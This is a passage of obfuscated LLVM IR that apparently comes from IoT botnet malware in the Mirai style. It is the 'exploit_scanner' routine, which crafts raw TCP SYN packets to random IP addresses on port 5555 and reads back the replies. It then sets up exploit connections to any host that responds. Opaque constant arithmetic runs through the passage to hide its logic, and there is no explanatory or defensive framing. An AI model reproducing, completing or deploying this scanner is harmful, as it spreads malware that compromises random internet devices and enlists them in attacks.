  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %239 = load i32, i32* @exploit_fake_time, align 4
  %240 = load i32, i32* %10, align 4
  %241 = icmp ne i32 %239, %240
  br i1 %241, label %242, label %309

; <label>:242:                                    ; preds = %238
  %243 = load i32, i32* @exploit_fake_time, align 4
  store i32 %243, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %244

; <label>:244:                                    ; preds = %302, %242
  %245 = load i32, i32* %1, align 4
  %246 = icmp slt i32 %245, 160
  br i1 %246, label %247, label %308

; <label>:247:                                    ; preds = %244
  %248 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %248, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @exploit_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %249 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i64 1
  %251 = bitcast %struct.iphdr* %250 to %struct.anon.0*
  store %struct.anon.0* %251, %struct.anon.0** %16, align 8
  %252 = call i32 @rand_next()
  %253 = trunc i32 %252 to i16
  %254 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 3
  store i16 %253, i16* %255, align 4
  %256 = load i32, i32* @LOCAL_ADDR, align 4
  %257 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 8
  store i32 %256, i32* %258, align 4
  %259 = call i32 @get_random_ip()
  %260 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 9
  store i32 %259, i32* %261, align 4
  %262 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 7
  store i16 0, i16* %263, align 2
  %264 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %265 = bitcast %struct.iphdr* %264 to i16*
  %266 = call zeroext i16 @checksum_generic(i16* %265, i32 20)
  %267 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 7
  store i16 %266, i16* %268, align 2
  %269 = call zeroext i16 @htons(i16 zeroext 5555) #9
  %270 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %271 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %270, i32 0, i32 1
  store i16 %269, i16* %271, align 2
  %272 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 9
  %274 = load i32, i32* %273, align 4
  %275 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %276 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %275, i32 0, i32 2
  store i32 %274, i32* %276, align 4
  %277 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %278 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %277, i32 0, i32 6
  store i16 0, i16* %278, align 4
  %279 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %280 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %281 = bitcast %struct.anon.0* %280 to i8*
  %282 = call zeroext i16 @htons(i16 zeroext 20) #9
  %283 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %279, i8* %281, i16 zeroext %282, i32 20)
  %284 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %285 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %284, i32 0, i32 6
  store i16 %283, i16* %285, align 4
  %286 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %286, align 4
  %287 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 9
  %289 = load i32, i32* %288, align 4
  %290 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %291 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %290, i32 0, i32 0
  store i32 %289, i32* %291, align 4
  %292 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %293 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %292, i32 0, i32 1
  %294 = load i16, i16* %293, align 2
  %295 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %294, i16* %295, align 2
  %296 = load i32, i32* @exploit_rsck, align 4
  %297 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %298 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %298, %struct.sockaddr** %297, align 8
  %299 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %300 = load %struct.sockaddr*, %struct.sockaddr** %299, align 8
  %301 = call i64 @sendto(i32 %296, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %300, i32 16)
  br label %302

; <label>:302:                                    ; preds = %247
  %303 = load i32, i32* %1, align 4
  %304 = add i32 %303, -811173815
  %305 = add i32 %304, 1
  %306 = sub i32 %305, -811173815
  %307 = add nsw i32 %303, 1
  store i32 %306, i32* %1, align 4
  br label %244

; <label>:308:                                    ; preds = %244
  br label %309

; <label>:309:                                    ; preds = %308, %238
  store i32 0, i32* %9, align 4
  br label %310

; <label>:310:                                    ; preds = %472, %441, %427, %412, %397, %386, %371, %362, %353, %346, %339, %309
  store i32 0, i32* %18, align 4
  %311 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %312 = bitcast i8* %311 to %struct.iphdr*
  store %struct.iphdr* %312, %struct.iphdr** %20, align 8
  %313 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i64 1
  %315 = bitcast %struct.iphdr* %314 to %struct.anon.0*
  store %struct.anon.0* %315, %struct.anon.0** %21, align 8
  %316 = call i32* @__errno_location() #9
  store i32 0, i32* %316, align 4
  %317 = load i32, i32* @exploit_rsck, align 4
  %318 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %319 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %319, align 8
  %320 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %321 = load %struct.sockaddr*, %struct.sockaddr** %320, align 8
  %322 = call i64 @recvfrom(i32 %317, i8* %318, i64 1514, i32 16384, %struct.sockaddr* %321, i32* null)
  %323 = trunc i64 %322 to i32
  store i32 %323, i32* %18, align 4
  %324 = load i32, i32* %18, align 4
  %325 = icmp sle i32 %324, 0
  br i1 %325, label %334, label %326

; <label>:326:                                    ; preds = %310
  %327 = call i32* @__errno_location() #9
  %328 = load i32, i32* %327, align 4
  %329 = icmp eq i32 %328, 11
  br i1 %329, label %334, label %330

; <label>:330:                                    ; preds = %326
  %331 = call i32* @__errno_location() #9
  %332 = load i32, i32* %331, align 4
  %333 = icmp eq i32 %332, 11
  br i1 %333, label %334, label %335

; <label>:334:                                    ; preds = %330, %326, %310
  br label %484

; <label>:335:                                    ; preds = %330
  %336 = load i32, i32* %18, align 4
  %337 = sext i32 %336 to i64
  %338 = icmp ult i64 %337, 40
  br i1 %338, label %339, label %340

; <label>:339:                                    ; preds = %335
  br label %310

; <label>:340:                                    ; preds = %335
  %341 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i32 0, i32 9
  %343 = load i32, i32* %342, align 4
  %344 = load i32, i32* @LOCAL_ADDR, align 4
  %345 = icmp ne i32 %343, %344
  br i1 %345, label %346, label %347

; <label>:346:                                    ; preds = %340
  br label %310

; <label>:347:                                    ; preds = %340
  %348 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 6
  %350 = load i8, i8* %349, align 1
  %351 = zext i8 %350 to i32
  %352 = icmp ne i32 %351, 6
  br i1 %352, label %353, label %354

; <label>:353:                                    ; preds = %347
  br label %310

; <label>:354:                                    ; preds = %347
  %355 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %356 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %355, i32 0, i32 0
  %357 = load i16, i16* %356, align 4
  %358 = zext i16 %357 to i32
  %359 = call zeroext i16 @htons(i16 zeroext 5555) #9
  %360 = zext i16 %359 to i32
  %361 = icmp ne i32 %358, %360
  br i1 %361, label %362, label %363

; <label>:362:                                    ; preds = %354
  br label %310

; <label>:363:                                    ; preds = %354
  %364 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %365 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %364, i32 0, i32 1
  %366 = load i16, i16* %365, align 2
  %367 = zext i16 %366 to i32
  %368 = load i16, i16* %2, align 2
  %369 = zext i16 %368 to i32
  %370 = icmp ne i32 %367, %369
  br i1 %370, label %371, label %372

; <label>:371:                                    ; preds = %363
  br label %310

; <label>:372:                                    ; preds = %363
  %373 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %374 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %373, i32 0, i32 4
  %375 = load i16, i16* %374, align 4
  %376 = lshr i16 %375, 9
  %377 = xor i16 %376, -1
  %378 = xor i16 1, -1
  %379 = xor i16 30248, -1
  %380 = or i16 %377, %378
  %381 = or i16 30248, %379
  %382 = xor i16 %380, -1
  %383 = and i16 %382, %381
  %384 = and i16 %376, 1
  %385 = icmp ne i16 %383, 0
  br i1 %385, label %387, label %386

; <label>:386:                                    ; preds = %372
  br label %310

; <label>:387:                                    ; preds = %372
  %388 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %389 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %388, i32 0, i32 4
  %390 = load i16, i16* %389, align 4
  %391 = lshr i16 %390, 12
  %392 = xor i16 1, -1
  %393 = xor i16 %391, %392
  %394 = and i16 %393, %391
  %395 = and i16 %391, 1
  %396 = icmp ne i16 %394, 0
  br i1 %396, label %398, label %397

; <label>:397:                                    ; preds = %387
  br label %310

; <label>:398:                                    ; preds = %387
  %399 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %400 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %399, i32 0, i32 4
  %401 = load i16, i16* %400, align 4
  %402 = lshr i16 %401, 10
  %403 = xor i16 %402, -1
  %404 = xor i16 1, -1
  %405 = xor i16 -2515, -1
  %406 = or i16 %403, %404
  %407 = or i16 -2515, %405
  %408 = xor i16 %406, -1
  %409 = and i16 %408, %407
  %410 = and i16 %402, 1
  %411 = icmp ne i16 %409, 0
  br i1 %411, label %412, label %413

; <label>:412:                                    ; preds = %398
  br label %310

; <label>:413:                                    ; preds = %398
  %414 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %415 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %414, i32 0, i32 4
  %416 = load i16, i16* %415, align 4
  %417 = lshr i16 %416, 8
  %418 = xor i16 %417, -1
  %419 = xor i16 1, -1
  %420 = xor i16 25077, -1
  %421 = or i16 %418, %419
  %422 = or i16 25077, %420
  %423 = xor i16 %421, -1
  %424 = and i16 %423, %422
  %425 = and i16 %417, 1
  %426 = icmp ne i16 %424, 0
  br i1 %426, label %427, label %428

; <label>:427:                                    ; preds = %413
  br label %310

; <label>:428:                                    ; preds = %413
  %429 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %430 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %429, i32 0, i32 3
  %431 = load i32, i32* %430, align 4
  %432 = call i32 @ntohl(i32 %431) #9
  %433 = sub i32 0, 1
  %434 = add i32 %432, %433
  %435 = sub i32 %432, 1
  %436 = call i32 @htonl(i32 %434) #9
  %437 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %438 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %437, i32 0, i32 8
  %439 = load i32, i32* %438, align 4
  %440 = icmp ne i32 %436, %439
  br i1 %440, label %441, label %442

; <label>:441:                                    ; preds = %428
  br label %310

; <label>:442:                                    ; preds = %428
  store %struct.exploit_scanner_connection* null, %struct.exploit_scanner_connection** %22, align 8
  %443 = load i32, i32* %9, align 4
  store i32 %443, i32* %18, align 4
  br label %444

; <label>:444:                                    ; preds = %462, %442
  %445 = load i32, i32* %18, align 4
  %446 = icmp slt i32 %445, 128
  br i1 %446, label %447, label %468

; <label>:447:                                    ; preds = %444
  %448 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %449 = load i32, i32* %18, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %448, i64 %450
  %452 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %451, i32 0, i32 2
  %453 = load i32, i32* %452, align 8
  %454 = icmp eq i32 %453, 0
  br i1 %454, label %455, label %461

; <label>:455:                                    ; preds = %447
  %456 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %457 = load i32, i32* %18, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %456, i64 %458
  store %struct.exploit_scanner_connection* %459, %struct.exploit_scanner_connection** %22, align 8
  %460 = load i32, i32* %18, align 4
  store i32 %460, i32* %9, align 4
  br label %468

; <label>:461:                                    ; preds = %447
  br label %462

; <label>:462:                                    ; preds = %461
  %463 = load i32, i32* %18, align 4
  %464 = add i32 %463, -1099173060
  %465 = add i32 %464, 1
  %466 = sub i32 %465, -1099173060
  %467 = add nsw i32 %463, 1
  store i32 %466, i32* %18, align 4
  br label %444

; <label>:468:                                    ; preds = %455, %444
  %469 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %470 = icmp eq %struct.exploit_scanner_connection* %469, null
  br i1 %470, label %471, label %472

; <label>:471:                                    ; preds = %468
  br label %484

; <label>:472:                                    ; preds = %468
  %473 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 8
  %475 = load i32, i32* %474, align 4
  %476 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %477 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %476, i32 0, i32 3
  store i32 %475, i32* %477, align 4
  %478 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %479 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %478, i32 0, i32 0
  %480 = load i16, i16* %479, align 4
  %481 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %482 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %481, i32 0, i32 4
  store i16 %480, i16* %482, align 8
  %483 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  call void @exploit_setup_connection(%struct.exploit_scanner_connection* %483)
  br label %310

; <label>:484:                                    ; preds = %471, %334
  br label %485

; <label>:485:                                    ; preds = %484
  %486 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %487 = getelementptr inbounds [16 x i64], [16 x i64]* %486, i64 0, i64 0
  %488 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %487) #6, !srcloc !1
  %489 = extractvalue { i64, i64* } %488, 0
  %490 = extractvalue { i64, i64* } %488, 1
  %491 = trunc i64 %489 to i32
  store i32 %491, i32* %24, align 4
  %492 = ptrtoint i64* %490 to i64
  %493 = trunc i64 %492 to i32
  store i32 %493, i32* %25, align 4
  br label %494

; <label>:494:                                    ; preds = %485
  br label %495

; <label>:495:                                    ; preds = %494
  %496 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %497 = getelementptr inbounds [16 x i64], [16 x i64]* %496, i64 0, i64 0
  %498 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %497) #6, !srcloc !2
  %499 = extractvalue { i64, i64* } %498, 0
  %500 = extractvalue { i64, i64* } %498, 1
  %501 = trunc i64 %499 to i32
  store i32 %501, i32* %26, align 4
  %502 = ptrtoint i64* %500 to i64
  %503 = trunc i64 %502 to i32
  store i32 %503, i32* %27, align 4
  br label %504

; <label>:504:                                    ; preds = %495
  store i32 0, i32* %1, align 4
  br label %505

; <label>:505:                                    ; preds = %643, %504
  %506 = load i32, i32* %1, align 4
  %507 = icmp slt i32 %506, 128
  br i1 %507, label %508, label %649

; <label>:508:                                    ; preds = %505
  store i32 5, i32* %28, align 4
  %509 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %510 = load i32, i32* %1, align 4
  %511 = sext i32 %510 to i64
  %512 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %509, i64 %511
  store %struct.exploit_scanner_connection* %512, %struct.exploit_scanner_connection** %7, align 8
  %513 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %514 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %513, i32 0, i32 2
  %515 = load i32, i32* %514, align 8
  %516 = icmp ne i32 %515, 0
  br i1 %516, label %517, label %539

; <label>:517:                                    ; preds = %508
  %518 = load i32, i32* @exploit_fake_time, align 4
  %519 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %520 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %519, i32 0, i32 1
  %521 = load i32, i32* %520, align 4
  %522 = sub i32 0, %521
  %523 = add i32 %518, %522
  %524 = sub i32 %518, %521
  %525 = load i32, i32* %28, align 4
  %526 = icmp ugt i32 %523, %525
  br i1 %526, label %527, label %539

; <label>:527:                                    ; preds = %517
  %528 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %529 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %528, i32 0, i32 0
  %530 = load i32, i32* %529, align 8
  %531 = call i32 @close(i32 %530)
  %532 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %533 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %532, i32 0, i32 0
  store i32 -1, i32* %533, align 8
  %534 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %535 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %534, i32 0, i32 2
  store i32 0, i32* %535, align 8
  %536 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %537 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %536, i32 0, i32 6
  %538 = getelementptr inbounds [256 x i8], [256 x i8]* %537, i32 0, i32 0
  call void @util_zero(i8* %538, i32 256)
  br label %643

; <label>:539:                                    ; preds = %517, %508
  %540 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %541 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %540, i32 0, i32 2
  %542 = load i32, i32* %541, align 8
  %543 = icmp eq i32 %542, 1
  br i1 %543, label %554, label %544

; <label>:544:                                    ; preds = %539
  %545 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %546 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %545, i32 0, i32 2
  %547 = load i32, i32* %546, align 8
  %548 = icmp eq i32 %547, 3
  br i1 %548, label %554, label %549

; <label>:549:                                    ; preds = %544
  %550 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %551 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %550, i32 0, i32 2
  %552 = load i32, i32* %551, align 8
  %553 = icmp eq i32 %552, 4
  br i1 %553, label %554, label %595

; <label>:554:                                    ; preds = %549, %544, %539
  %555 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %556 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %555, i32 0, i32 0
  %557 = load i32, i32* %556, align 8
  %558 = srem i32 %557, 64
  %559 = zext i32 %558 to i64
  %560 = shl i64 1, %559
  %561 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %562 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %563 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %562, i32 0, i32 0
  %564 = load i32, i32* %563, align 8
  %565 = sdiv i32 %564, 64
  %566 = sext i32 %565 to i64
  %567 = getelementptr inbounds [16 x i64], [16 x i64]* %561, i64 0, i64 %566
  %568 = load i64, i64* %567, align 8
  %569 = xor i64 %568, -1
  %570 = xor i64 %560, -1
  %571 = xor i64 -8322261261282137904, -1
  %572 = and i64 %569, -8322261261282137904
  %573 = and i64 %568, %571
  %574 = and i64 %570, -8322261261282137904
  %575 = and i64 %560, %571
  %576 = or i64 %572, %573
  %577 = or i64 %574, %575
  %578 = xor i64 %576, %577
  %579 = or i64 %569, %570
  %580 = xor i64 %579, -1
  %581 = or i64 -8322261261282137904, %571
  %582 = and i64 %580, %581
  %583 = or i64 %578, %582
  %584 = or i64 %568, %560
  store i64 %583, i64* %567, align 8
  %585 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %586 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %585, i32 0, i32 0
  %587 = load i32, i32* %586, align 8
  %588 = load i32, i32* %12, align 4
  %589 = icmp sgt i32 %587, %588
  br i1 %589, label %590, label %594

; <label>:590:                                    ; preds = %554
  %591 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %592 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %591, i32 0, i32 0
  %593 = load i32, i32* %592, align 8
  store i32 %593, i32* %12, align 4
  br label %594

; <label>:594:                                    ; preds = %590, %554
  br label %642

; <label>:595:                                    ; preds = %549
  %596 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %597 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %596, i32 0, i32 2
  %598 = load i32, i32* %597, align 8
  %599 = icmp ne i32 %598, 0
  br i1 %599, label %600, label %641

; <label>:600:                                    ; preds = %595
  %601 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %602 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %601, i32 0, i32 0
  %603 = load i32, i32* %602, align 8
  %604 = srem i32 %603, 64
  %605 = zext i32 %604 to i64
  %606 = shl i64 1, %605
  %607 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %608 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %609 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %608, i32 0, i32 0
  %610 = load i32, i32* %609, align 8
  %611 = sdiv i32 %610, 64
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds [16 x i64], [16 x i64]* %607, i64 0, i64 %612
  %614 = load i64, i64* %613, align 8
  %615 = xor i64 %614, -1
  %616 = xor i64 %606, -1
  %617 = xor i64 5435749109378313605, -1
  %618 = and i64 %615, 5435749109378313605
  %619 = and i64 %614, %617
  %620 = and i64 %616, 5435749109378313605
  %621 = and i64 %606, %617
  %622 = or i64 %618, %619
  %623 = or i64 %620, %621
  %624 = xor i64 %622, %623
  %625 = or i64 %615, %616
  %626 = xor i64 %625, -1
  %627 = or i64 5435749109378313605, %617
  %628 = and i64 %626, %627
  %629 = or i64 %624, %628
  %630 = or i64 %614, %606
  store i64 %629, i64* %613, align 8
  %631 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %632 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %631, i32 0, i32 0
  %633 = load i32, i32* %632, align 8
  %634 = load i32, i32* %11, align 4
  %635 = icmp sgt i32 %633, %634
  br i1 %635, label %636, label %640

; <label>:636:                                    ; preds = %600
  %637 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %638 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %637, i32 0, i32 0
  %639 = load i32, i32* %638, align 8
  store i32 %639, i32* %11, align 4
  br label %640

; <label>:640:                                    ; preds = %636, %600
  br label %641

; <label>:641:                                    ; preds = %640, %595
  br label %642

; <label>:642:                                    ; preds = %641, %594
  br label %643

; <label>:643:                                    ; preds = %642, %527
  %644 = load i32, i32* %1, align 4
  %645 = sub i32 %644, -767005091
  %646 = add i32 %645, 1
  %647 = add i32 %646, -767005091
  %648 = add nsw i32 %644, 1
  store i32 %647, i32* %1, align 4
  br label %505

; <label>:649:                                    ; preds = %505
  %650 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %650, align 8
  %651 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i64 1, i64* %651, align 8
  %652 = load i32, i32* %12, align 4
  %653 = load i32, i32* %11, align 4
  %654 = icmp sgt i32 %652, %653
  br i1 %654, label %655, label %657

; <label>:655:                                    ; preds = %649
  %656 = load i32, i32* %12, align 4
  br label %659

; <label>:657:                                    ; preds = %649
  %658 = load i32, i32* %11, align 4
  br label %659

; <label>:659:                                    ; preds = %657, %655
  %660 = phi i32 [ %656, %655 ], [ %658, %657 ]
  %661 = sub i32 1, -901260228
  %662 = add i32 %661, %660
  %663 = add i32 %662, -901260228
  %664 = add nsw i32 1, %660
  %665 = call i32 @select(i32 %663, %struct.fd_set* %5, %struct.fd_set* %6, %struct.fd_set* null, %struct.timeval* %8)
  store i32 %665, i32* %13, align 4
  %666 = call i64 @time(i64* null) #6
  %667 = trunc i64 %666 to i32
  store i32 %667, i32* @exploit_fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %668

; <label>:668:                                    ; preds = %908, %659
  %669 = load i32, i32* %1, align 4
  %670 = icmp slt i32 %669, 128
  br i1 %670, label %671, label %914

; <label>:671:                                    ; preds = %668
  %672 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %673 = load i32, i32* %1, align 4
  %674 = sext i32 %673 to i64
  %675 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %672, i64 %674
  store %struct.exploit_scanner_connection* %675, %struct.exploit_scanner_connection** %7, align 8
  %676 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %677 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %676, i32 0, i32 0
  %678 = load i32, i32* %677, align 8
  %679 = icmp eq i32 %678, -1
  br i1 %679, label %680, label %681

; <label>:680:                                    ; preds = %671
  br label %908

; <label>:681:                                    ; preds = %671
  %682 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %683 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %684 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %683, i32 0, i32 0
  %685 = load i32, i32* %684, align 8
  %686 = sdiv i32 %685, 64
  %687 = sext i32 %686 to i64
  %688 = getelementptr inbounds [16 x i64], [16 x i64]* %682, i64 0, i64 %687
  %689 = load i64, i64* %688, align 8
  %690 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %691 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %690, i32 0, i32 0
  %692 = load i32, i32* %691, align 8
  %693 = srem i32 %692, 64
  %694 = zext i32 %693 to i64
  %695 = shl i64 1, %694
  %696 = xor i64 %689, -1
  %697 = xor i64 %695, -1
  %698 = xor i64 -7725621132423904810, -1
  %699 = or i64 %696, %697
  %700 = or i64 -7725621132423904810, %698
  %701 = xor i64 %699, -1
  %702 = and i64 %701, %700
  %703 = and i64 %689, %695
  %704 = icmp ne i64 %702, 0
  br i1 %704, label %705, label %775

; <label>:705:                                    ; preds = %681
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %706 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %707 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %706, i32 0, i32 0
  %708 = load i32, i32* %707, align 8
  %709 = bitcast i32* %29 to i8*
  %710 = call i32 @getsockopt(i32 %708, i32 1, i32 4, i8* %709, i32* %31) #6
  store i32 %710, i32* %30, align 4
  %711 = load i32, i32* %29, align 4
  %712 = icmp eq i32 %711, 0
  br i1 %712, label %713, label %765

